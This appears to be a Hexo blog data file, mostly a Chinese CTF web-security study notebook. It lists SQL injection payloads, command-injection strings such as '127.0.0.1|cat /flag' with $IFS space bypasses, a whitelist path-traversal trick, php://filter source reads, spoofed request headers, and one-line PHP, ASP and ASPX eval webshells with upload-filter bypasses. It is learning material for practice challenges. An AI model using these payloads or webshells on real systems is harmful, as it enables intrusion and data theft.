class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br>...<br>&#125;<br><br>等价于<br><br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)<br>&#123;<br>...<br>i++;<br>&#125;<br></code></pre></td></tr></table></figure><p>题解代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-2</span>;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-2</span>;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web学习笔记</title>
    <link href="/2023/07/08/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/07/08/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Web学习笔记（Updating…）"><a href="#Web学习笔记（Updating…）" class="headerlink" title="Web学习笔记（Updating…）"></a>Web学习笔记（Updating…）</h1><p>$\mathscr{Author:CoolWind}$</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h5 id="1-万能密码"><a href="#1-万能密码" class="headerlink" title="1.万能密码"></a>1.万能密码</h5><p>能使用万能密码注入的sql语句形如<code>SELECT * FROM admin WHERE Username= &#39;&quot;.$username.&quot;&#39; AND Password= &#39;&quot;.md5($password).&quot;&#39;</code></p><p>由于MySQL中优先级关系为<code>or&lt;and&lt;not</code>，故如果我们构造一个为真的语句用<code>OR</code>链接，那么就可以使该语句的返回值为<code>TRUE</code>，即能成功进入。</p><p><strong>例如：</strong>输入以下语句：<code>1&#39; OR &#39;1&#39;=&#39;1</code>，将其拼接到<code>Password</code>的地方，那么在拼接时会将其拼接为<code>SELECT * FROM admin WHERE Username= &#39;1&#39; AND Password= &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;</code>，这样<code>&#39;1&#39;=&#39;1&#39;</code>为真，故从右向左结合，整个句子为真，即注入成功。</p><h5 id="2-堆叠注入之爆库（show的使用）"><a href="#2-堆叠注入之爆库（show的使用）" class="headerlink" title="2. 堆叠注入之爆库（show的使用）"></a>2. 堆叠注入之爆库（show的使用）</h5><p>在sql语句中，可以进行堆叠注入，即使用<code>;</code>符号将很多sql语句连接在一起进行爆库、爆表的操作。</p><blockquote><p><code>show databases</code>：爆数据库</p><p><code>show tables</code>：爆表</p><p><code>show columns from xxxx</code>：爆xxxx表中的列</p><p>注：如果xxxx表的名称为数字，那么需要用反引号进行包含。</p></blockquote><h5 id="3-堆叠注入之改表（rename-alter-SQL约束的使用）"><a href="#3-堆叠注入之改表（rename-alter-SQL约束的使用）" class="headerlink" title="3. 堆叠注入之改表（rename alter SQL约束的使用）"></a>3. 堆叠注入之改表（rename alter SQL约束的使用）</h5><p>可以通过将需要的表改为默认的表名，并且根据原表一比一复制列名进行改表，从而拿到flag。</p><p><strong>alter相关：</strong></p><ul><li><p>改表名：<code>alter table &quot; table_name&quot; rename to &quot; new_name&quot;</code></p></li><li><p>添加一个列：<code>alter table &quot; table_name&quot; add &quot;column_name&quot; type;</code></p></li><li>删除一个列：<code>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</code></li><li>改变列的数据类型：<code>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</code></li><li>改列名：<code>alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</code>或者<code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></li></ul><p><strong>SQL约束相关：</strong></p><ul><li><strong>not null</strong>-指示某列不能储存NULL值：<code>alter table persons modify age int not null;//设置 not null 约束</code> 以及<code>alter table person modify age int null;//取消 null 约束</code></li><li><strong>primary key</strong>-NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键：<code>alter table persons add age primary key (id)</code></li><li><strong>unique</strong>-保证某列的每行必须有唯一的值。（注：可以有多个 UNIQUE 约束，只能有一个 PRIMARY KEY 约束）：<code>alter table person add unique (id);//增加unique约束。</code></li><li><strong>check</strong>-限制列中值的范围：<code>alter table person add check (id&gt;0);</code></li><li><strong>default</strong>-规定没有给列赋值时的默认值：<code>alter table person alter column city set default &#39;chengdu&#39; ;</code></li><li><strong>auto_increment</strong>-自动赋值，默认从1开始。</li><li><strong>foreign key</strong>-保证一个表中的数据匹配另一个表中的值的参照完整性。</li></ul><p>例如<strong>[强网杯 2019]随便注：</strong></p><p>可以通过如下语句进行改表以及约束，从而查询flag：<code>1&#39;; rename table words to word1; alter table &#39;1919810931114514&#39; rename to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></p><p>以上语句实现了修改表名、给表增加列并且约束为自增、非空以及自动赋值。</p><h5 id="4-设置变量编码execute执行处理"><a href="#4-设置变量编码execute执行处理" class="headerlink" title="4. 设置变量编码execute执行处理"></a>4. 设置变量编码execute执行处理</h5><p>例如<strong>[强网杯 2019]随便注：</strong></p><p>由于<code>select</code>被过滤，可以将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from `1919810931114514` <br></code></pre></td></tr></table></figure><p> 进行16进制编码，再进行execute进行执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">;SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure><p><code>SET</code>和<code>@</code>可以设置变量，将其设置为要执行语句的十六进制编码，之后进行<code>prepare...from...</code>的预处理，然后进行<code>execute</code>的执行。</p><h5 id="5-handler读入"><a href="#5-handler读入" class="headerlink" title="5. handler读入"></a>5. handler读入</h5><p><code>handler</code>语句可以生成一个指向指定表的指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler table_name open as handler_name;<br></code></pre></td></tr></table></figure><p>可以通过<code>read next</code>语句读取表的下一行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler handler_name read next;<br></code></pre></td></tr></table></figure><p>例如<strong>[强网杯 2019]随便注：</strong></p><p>可以通过构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#<br></code></pre></td></tr></table></figure><p>进行一个flag的读取。</p><p>注：可以通过多次调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler `a` read next;<br></code></pre></td></tr></table></figure><p>进行表中多行数据的查。</p><h5 id="6-的妙用"><a href="#6-的妙用" class="headerlink" title="6. *的妙用"></a>6. <code>*</code>的妙用</h5><p>在没有头绪的时候可以尝试使用<code>*</code>来进行一个所有字段的查。</p><p>例如<strong>[SUCTF 2019]EasySQL：</strong></p><p>由于没有过滤<code>*</code>，因此可以构造payload为：<code>*,1</code>从而查到所有的字段，爆flag。</p><h5 id="7-联合查询"><a href="#7-联合查询" class="headerlink" title="7. 联合查询"></a>7. 联合查询</h5><p>可以使用<code>union select</code>进行联合查询，完成爆回显点、爆库、爆表等操作。</p><ul><li>使用<code>union select 1,2,3</code>等语句进行爆回显点。</li><li>使用<code>union select database()</code>爆库名</li><li>使用<code>union select group_concat(table_name) from information_schema.tables where table_schema=database()</code>爆表名</li><li>使用<code>union select group_concat(conlumn_name) from information_schema.columns where table_name=&#39;your_table_name&#39;</code>爆列名</li><li>使用<code>union select group_concat(column1,column2,...,columnx) from your_table_name</code>爆数据</li></ul><blockquote><p>information_schema是一个信息数据库，其中包括了该数据库中的所有内容。</p><p>更详细的内容可以查看<a href="https://blog.csdn.net/kikajack/article/details/80065753">CSDN带佬的文章</a>。</p></blockquote><h5 id="8-双写绕过"><a href="#8-双写绕过" class="headerlink" title="8. 双写绕过"></a>8. 双写绕过</h5><p>如果<code>union</code>、<code>select</code>等注入短语被检测删除，可以通过双写进行绕过。</p><p>双写绕过是通过将相同的词语进行包含，通过检测同时保留本身功能。</p><p>例如<strong>[极客大挑战 2019]BabySQL：</strong></p><p>本题过滤了<code>union</code>、<code>select</code>等词语，因此需要通过双写进行绕过爆表。</p><p>例如将<code>union</code>改为<code>ununionion</code>，当其中的<code>union</code>被过滤掉之后，剩余的字符串仍然可以拼接成<code>union</code>，因此能够保留其功能。</p><h3 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h3><h5 id="1-GET变量的使用"><a href="#1-GET变量的使用" class="headerlink" title="1. $_GET变量的使用"></a>1. $_GET变量的使用</h5><p>在php代码中,<code>$_GET[]</code>可以从URL中获取到该数组中键的值，并且赋值给使用它的变量。</p><p>例如<strong>[极客大挑战 2019]Havefun：</strong></p><p>f12注释中给出的审计代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cat</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cat</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$cat</span>==<span class="hljs-string">&#x27;dog&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>因此我们可以在URL后构造payload：<code>/?cat=dog</code>即可以显现flag。</p><h5 id="2-上层目录的访问"><a href="#2-上层目录的访问" class="headerlink" title="2. 上层目录的访问"></a>2. 上层目录的访问</h5><p>在php代码中，<code>include</code>函数用于包含其后所链接的路径/文件名称的文件。<code>$_REQUEST</code>语句用于获取其包含的键的值，与<code>$_GET</code>类似。</p><p>因此，可以通过构造payload实现对服务器上层文件的访问。</p><p>例如<strong>[HCTF 2018]WarmUp：</strong></p><p>通过访问<code>source.php</code>文件可以看到如下高亮代码（当然注释是大佬答案给的）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-comment">//如果page的值为空或者不是字符串</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><span class="hljs-comment">//检测page的值是否在白名单中</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)//查找字符串在另一个字符串中首次出现的位置<br>            );<br>            <span class="hljs-comment">//检验page的值是否在白名单内</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//将url编码后的字符串还原成未编码的样子，然后赋值给page</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-comment">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)//查找字符串在另一个字符串中首次出现的位置<br>            );<br>            <span class="hljs-comment">//检验page的值是否在白名单内</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>结合给出的hint：<strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>我们可以知道flag在名为ffffllllaaaagggg的文件中，因此需要找到该文件。根据代码因为<code>$_REQUEST</code>的是<code>file</code>，同时通过读码可以知道，<code>hint.php</code>是在白名单中的，并且可以通过问号切割，因此通过构造<code>?file=hint.php?../../../../../ffffllllaaaagggg</code>的payload，就可以访问到名为<code>ffffllllaaaagggg</code>的文件，成功拿到flag。</p><h5 id="3-php-filter协议查看源码"><a href="#3-php-filter协议查看源码" class="headerlink" title="3. php://filter协议查看源码"></a>3. php://filter协议查看源码</h5><p><code>php://filter/read=convert.base64-encode/resource=xxx.php</code><br>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，<strong>可以进行任意文件的读取。</strong></p><blockquote><p>根据名字filter，可以很容易想到这个协议可以用来过滤一些东西；使用不同的参数可以达到不同的目的和效果：<br>resource=&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选<br>read=&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>&lt;；两个链的筛选列表&gt; 任何没有以 read= 或write=作前缀 的筛选器列表会视情况应用于读或写链。<br>php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。<br>read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p></blockquote><p>例如<strong>[ACTF2020 新生赛]Include</strong></p><p>通过构造payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>可以通过<code>base64</code>编码组织php文件的运行，从而读取到源码，拿到注释中的flag。</p><h3 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h3><h5 id="1-ls-cat-命令的应用"><a href="#1-ls-cat-命令的应用" class="headerlink" title="1. ls cat 命令的应用"></a>1. ls cat 命令的应用</h5><blockquote><p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)。</p><p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。</p></blockquote><p>通过这两个命令，可以对靶机系统进行操作，从而显示出其中的flag文件。</p><p>例如<strong>[ACTF2020 新生赛]Exec</strong></p><p>可以输入<code>127.0.0.1|ls</code>对当前目录下文件进行查询，之后可以通过<code>127.0.0.1|ls /</code>对其根目录文件进行查询，进而查找到flag文件的位置。</p><p>之后通过<code>127.0.0.1|cat /flag</code>可以将文件内容打印到屏幕上，获取flag。</p><h5 id="2-代替、拼接字符串绕过"><a href="#2-代替、拼接字符串绕过" class="headerlink" title="2. 代替、拼接字符串绕过"></a>2. 代替、拼接字符串绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">命令中空格被过滤的解决方法：<br>&#123;cat,flag.txt&#125;<br><span class="hljs-meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag.txt</span><br><span class="hljs-meta prompt_">cat$</span><span class="language-bash">IFS<span class="hljs-variable">$9flag</span>.txt:  $IFS<span class="hljs-variable">$9</span> <span class="hljs-variable">$9</span>指传过来的第9个参数</span><br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)<br></code></pre></td></tr></table></figure><p>可以通过调用变量进行一个过滤的绕过：</p><p>例如<strong>[GXYCTF2019]Ping Ping Ping：</strong></p><p>该题过滤了空格以及<code>flag</code>关键词，因此可以选择变量绕过。</p><p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code>，这样构造可以通过声明一个变量a，将其赋值为g，然后在<code>cat</code>的过程中使用变量a将g替换，这样可以绕过<code>flag</code>以及空格的过滤，从而进行一个过滤的绕过。</p><blockquote><p>经过实验可以知道，在空格绕过时$9可以替换为任意1-9数字，因为$n代表shell中传递给脚本的第n个参数，如果没有传递参数，那么返回值为空，仅对$IFS与文件名进行一个分割作用。</p><p>同时了解到，如果不将<code>.</code>之前的字母使用变量替换，那么会导致在解析过程中该值被提前替换，从而无法起到绕过的作用。</p></blockquote><h5 id="3-内联执行"><a href="#3-内联执行" class="headerlink" title="3.  内联执行"></a>3.  内联执行</h5><p>在linux中，可以通过反引号<code>` </code>进行一个函数的内联。内联函数会先执行，并且将执行结果直接连接到内联函数所在的地方，这样就可以绕过过滤。</p><p>例如<strong>[GXYCTF2019]Ping Ping Ping：</strong></p><p>同上，我们可以构造如下payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?ip=127.0.0.1;cat$IFS$9`ls`<br></code></pre></td></tr></table></figure><p>这样就可以进行内联操作，直接展示<code>flag.php</code>以及<code>index.php</code>的源代码，从而获取到flag。</p><h3 id="Http相关"><a href="#Http相关" class="headerlink" title="Http相关"></a>Http相关</h3><h5 id="1-使用burpsuite进行网站抓包"><a href="#1-使用burpsuite进行网站抓包" class="headerlink" title="1. 使用burpsuite进行网站抓包"></a>1. 使用burpsuite进行网站抓包</h5><p>将需要抓包的url用添加代理的浏览器打开或者添加扫描，可以查看网站的返回值，从而看到源码。</p><p>例如<strong>[极客大挑战 2019]Secret File</strong></p><h5 id="2-更改http请求头"><a href="#2-更改http请求头" class="headerlink" title="2. 更改http请求头"></a>2. 更改http请求头</h5><p>可以通过hackbar直接更改请求头，或者通过burpsuite进行抓包更改。</p><ul><li><code>Referer</code>字段用于指示当前请求是从哪个URL（引用页）跳转而来的。它提供了有关引用页面的信息，帮助服务器了解请求的上下文和来源。</li><li><code>User-Agent</code>字段用于标识发起请求的客户端（通常是浏览器）的相关信息。它包含了客户端应用程序或设备的名称、版本号、操作系统和其他相关描述，帮助服务器了解发送请求的客户端特性和能力。</li><li><code>X-Forwarded-For</code>字段用于指示请求经过的代理服务器链路上的客户端IP地址。</li></ul><p>例如<strong>[极客大挑战 2019]Http：</strong></p><p>需要通过更改请求头为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://www.Sycsecret.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Syclover<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>更改引用页面、浏览器标识以及伪造本地阅读，从而拿到flag。</p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><blockquote><p>本类题主要通过上传端口上传一句话木马进而通过蚁剑对服务器进行访问，最终拿到flag。</p></blockquote><p>常见的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php的一句话木马： <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>asp的一句话是：   &lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span> (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><p>基本原理：利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;attack&#39;]</code>表示从页面中获得<code>attack</code>这个参数值。</p><blockquote><p>蚁剑中的连接密码是<code>$_POST</code>之后的字符串。</p></blockquote><p>例如<strong>[极客大挑战 2019]Knife：</strong></p><p>网页中给出了<code>eval($_POST[&#39;Syc&#39;])</code>，因而将其作为连接密码通过蚁剑进行连接，从而能够获取到flag。</p><p>除此之外，有时需要应用burpsuite进行传入文件的类型或者文件名称的更改。</p><blockquote><p>需要将文件后缀名改为<code>phtml</code>上传，因为<code>phtml</code>文件可以被服务器认作<code>php</code>文件进行执行。</p></blockquote><p>例如<strong>[极客大挑战 2019]Upload、[ACTF2020 新生赛]Upload：</strong></p><p>这两道题分别需要通过抓包更改文件的类型<code>Content-Type</code>或者<code>filename</code>进行检测的绕过。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUAACTF-Writeup</title>
    <link href="/2023/04/27/BUAACTF-Writeup/"/>
    <url>/2023/04/27/BUAACTF-Writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="BUAACTF-Writeup"><a href="#BUAACTF-Writeup" class="headerlink" title="BUAACTF-Writeup"></a>BUAACTF-Writeup</h1><p>$\mathscr{Author:CoolWind}$</p><blockquote><p>大一鼠鼠完全不会别的只能水水misc拿点分数罢了QnQ</p><p>仅供参考，大佬勿喷</p></blockquote><p>第一次打CTF扔点入不了眼的战绩：</p><p><img src="\img\BUAACTF\微信截图_20230426142636.png" alt=""></p><ul><li>总排名：10/45</li><li>新星赛赛道：5/23</li><li>Misc：6/8 一血x1 二血x1 三血x2</li><li>Web：1/8</li><li>Reserve：3/9</li></ul><p>所以说啊，鼠鼠是<del>一柱擎天型选手</del>，除了misc完全都不会捏。</p><p>求大佬教我本领。</p><h2 id="Misc向"><a href="#Misc向" class="headerlink" title="Misc向"></a>Misc向</h2><h3 id="1、zhuzhu"><a href="#1、zhuzhu" class="headerlink" title="1、zhuzhu*"></a>1、zhuzhu*</h3><blockquote><p>屑X2喜欢的鬼灭开更啦！特地把flag藏在了猪猪的图片里，你能找到吗？</p><p>hint1：糟了，X2貌似在gift里放了不得了的东西？</p></blockquote><p>下载压缩包之后，直接解压压缩包，得到如下四个文件。</p><p><img src="\img\BUAACTF\微信截图_20230426143531.png" alt="解压压缩包"></p><p>因为本身下载了MATLAB，所以自动识别出了<code>enc1.m</code>是MATLAB的代码文件。</p><p>用MATLAB打开之后发现其为一份傅里叶变换的加密的代码，同时发现其中有<code>flag.png</code>。</p><p><img src="\img\BUAACTF\微信截图_20230426144054.png" 